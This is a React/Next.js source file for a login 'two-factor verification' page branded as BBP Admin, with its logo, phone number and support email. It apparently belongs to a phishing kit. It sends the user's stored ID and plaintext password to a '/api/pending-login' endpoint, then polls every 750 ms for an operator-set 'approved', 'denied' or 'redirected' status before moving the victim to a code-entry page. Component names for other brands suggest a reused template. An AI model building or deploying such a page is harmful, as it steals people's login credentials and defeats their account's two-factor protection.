'use client'


import { MSG_UNABLE_VERIFY_TIME } from "@/lib/approval-messages"
const POLL_INTERVAL_MS = 750
const WAIT_TIMEOUT_MS = 90 * 1000
import Link from "next/link"
import Image from "next/image"
import { useState, useEffect, useRef } from 'react'
import { Phone, Mail, MessageSquare, X, ArrowLeft, ArrowRight, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Footer } from "@/components/footer"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import { useRequireLoginFlow } from "@/hooks/use-require-login-flow"
import { setAptiaLoginFlowStage } from "@/hooks/use-aptia-login-flow-guard"
import {
  BBP_PRIMARY_BUTTON_CLASS,
  BBP_SECONDARY_BUTTON_CLASS,
} from "@/lib/wealthcare-button-styles"

const VERIFICATION_LOADING_MS = 10000

export default function Login2FAVerifyPage() {
  const allowed = useRequireLoginFlow()
  const [maskedEmail, setMaskedEmail] = useState("**********")
  const [maskedPhone, setMaskedPhone] = useState("***-***-****")
  const [isLoading, setIsLoading] = useState(false)
  const [loadingMethod, setLoadingMethod] = useState<'email' | 'text' | null>(null)

  const [pendingId, setPendingId] = useState<string | null>(null)
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const [optionClicked, setOptionClicked] = useState(false)

  useEffect(() => {
    if (!allowed || typeof window === 'undefined') return
    const email = sessionStorage.getItem('maskedEmail')
    const phone = sessionStorage.getItem('maskedPhone')
    if (email) setMaskedEmail(email)
    if (phone) setMaskedPhone(phone)
  }, [allowed])

  const handleVerificationMethod = async (method: 'email' | 'text') => {
    if (loadingMethod !== null || isLoading) return

    setLoadingMethod(method)
    setIsLoading(true)

    trackFormSubmission({
      type: method === 'email' ? 'email_verification' : 'text_verification',
      page: `/login/2fa-verify?method=${method}`,
      userId: typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : '',
      ...(method === 'email' ? { email: maskedEmail } : { phone: maskedPhone }),
    }).catch(() => { })

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('verificationMethod', method)
        sessionStorage.setItem('maskedEmail', maskedEmail)
        sessionStorage.setItem('maskedPhone', maskedPhone)
      }
      const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
      const password = typeof window !== 'undefined' ? sessionStorage.getItem('loginPassword') ?? '' : ''
      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password,
          method,
          maskedEmail,
          maskedPhone,
          flow: 'login',
        }),
      })
      const data = await res.json()
      if (data.id) {
        setPendingId(data.id)
        return
      }
      setLoadingMethod(null)
      setIsLoading(false)
      setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
    } catch {
      setLoadingMethod(null)
      setIsLoading(false)
      setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
    }
  }


  useEffect(() => {
    if (!pendingId) return

    const clearPolling = () => {
      if (pollRef.current) {
        clearInterval(pollRef.current)
        pollRef.current = null
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current)
        timeoutRef.current = null
      }
    }

    timeoutRef.current = setTimeout(() => {
      clearPolling()
      setPendingId(null)
      setLoadingMethod(null)
      setIsLoading(false)
      setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
    }, WAIT_TIMEOUT_MS)

    const poll = async () => {
      try {
        const res = await fetch(`/api/pending-login/${encodeURIComponent(pendingId)}`, {
          cache: 'no-store',
          headers: { 'Cache-Control': 'no-cache', Pragma: 'no-cache' },
        })
        if (!res.ok) return
        const data = await res.json()
        const status = String(data?.status ?? '').trim().toLowerCase()

        if (status === 'approved') {
          clearPolling()
          const approvedMethod = data?.method || loadingMethod
          if (typeof window !== 'undefined' && approvedMethod) {
            sessionStorage.setItem('verificationMethod', approvedMethod)
            sessionStorage.setItem('maskedEmail', maskedEmail)
            sessionStorage.setItem('maskedPhone', maskedPhone)
            sessionStorage.setItem('loginFrom2fa', '1')
            setAptiaLoginFlowStage('otp')
          }
          window.location.href = `/login/verify-code?method=${approvedMethod}`
          return
        }

        if (status === 'redirected') {
          clearPolling()
          window.location.href = '/api/login-out'
          return
        }

        if (status === 'denied' || status === 'expired') {
          clearPolling()
          if (status === 'denied') {
            window.location.href = '/?loginDenied=1'
            return
          }
          setPendingId(null)
          setLoadingMethod(null)
          setIsLoading(false)
          setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
        }
      } catch {
        // ignore temporary poll errors
      }
    }

    pollRef.current = setInterval(poll, POLL_INTERVAL_MS)
    poll()

    return clearPolling
  }, [pendingId, loadingMethod, maskedEmail, maskedPhone])

  const isWaiting = loadingMethod !== null && pendingId !== null
  const showMethodSelection = !isWaiting

  if (!allowed) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <p className="text-gray-600">Loading...</p>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 px-6 py-[15px]">
        <div className="flex items-center">
          <div className="flex items-center gap-6 flex-1 min-w-0">
            {/* Logo */}
            <Link href="/" className="flex items-center shrink-0">
              <Image
                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                alt="BBP Admin"
                width={120}
                height={40}
                className="h-[40px] w-auto"
                priority
              />
            </Link>

            {/* Contact Info - visible on all sizes; on mobile replaces Login label */}
            <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto shrink-0">
              <div className="flex items-center gap-2">
                <Phone className="w-3 h-3" />
                <span>(630) 773-2337</span>
              </div>
              <div className="flex items-center gap-2 mt-0.5">
                <Mail className="w-3 h-3" />
                <span>support@bbpadmin.com</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-6 py-8">
        <div className="w-full max-w-3xl">
          {isWaiting && (
            <div className="text-center py-8">
              <Loader2 className="w-10 h-10 animate-spin text-gray-500 mx-auto mb-3" />
              <p className="text-sm text-gray-500 mb-2">
                Sending verification code to{" "}
                {loadingMethod === "email" ? "your email" : "your phone"}...
              </p>
            </div>
          )}

          {showMethodSelection && (
            <>
          <p className="text-center text-gray-700 mb-8">
            We found you! Pick a method to receive a verification code now.
          </p>

          <div className="max-w-lg mx-auto space-y-4 mb-8">
            {/* Email Option */}
            <div className={`flex items-center justify-between gap-4 ${optionClicked ? 'opacity-60 pointer-events-none' : ''}`}>
              <div className="text-gray-700">
                <span>Send code to email:</span>
                <span className="font-medium"> {maskedEmail}</span>
              </div>
              <Button
                className={`${BBP_PRIMARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
                onClick={() => handleVerificationMethod('email')}
                disabled={isLoading}
              >
                {isLoading ? 'Loading...' : <><Mail className="w-4 h-4 mr-2" /> E-MAIL</>}
              </Button>
            </div>

            {/* Text Option */}
            <div className={`flex items-center justify-between gap-4 ${optionClicked ? 'opacity-60 pointer-events-none' : ''}`}>
              <div className="text-gray-700">
                <span>Send code via text:</span>
                <span className="font-medium"> {maskedPhone}</span>
              </div>
              <Button
                className={`${BBP_PRIMARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
                onClick={() => handleVerificationMethod('text')}
                disabled={isLoading}
              >
                {isLoading ? 'Loading...' : <><MessageSquare className="w-4 h-4 mr-2" /> TEXT</>}
              </Button>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex items-center justify-center gap-3 mb-6">
            <Link href="/">
              <Button
                className={`${BBP_SECONDARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
              >
                <X className="w-4 h-4 mr-2" />
                CANCEL
              </Button>
            </Link>
            <Link href="/">
              <Button
                className={`${BBP_SECONDARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                BACK
              </Button>
            </Link>
          </div>
            </>
          )}
        </div>
      </main>

      <Footer />
    </div>
  )
}
